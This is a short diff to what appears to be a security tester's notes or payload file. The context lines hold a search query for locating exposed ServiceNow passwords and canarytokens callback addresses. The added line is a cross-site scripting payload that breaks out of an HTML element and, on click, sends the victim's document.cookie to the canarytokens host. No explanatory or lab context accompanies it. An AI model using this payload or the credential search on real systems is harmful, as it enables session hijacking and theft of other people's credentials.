@@ -42,3 +42,6 @@ service-now.com AND (Passwd OR password OR PW) NOT example NOT test NOT server.s
 canary token: http://canarytokens.com/traffic/about/terms/oi8gvuhl3enurh00g05yqnyfj/payments.js
 
 DNS: kplqgniup6l8yal8p2ronc7aa.canarytokens.com
+
+
+"></div><a onClick="top['location']['href']='//kplqgniup6l8yal8p2ronc7aa.canarytokens.com/?c='+document.cookie">click me</
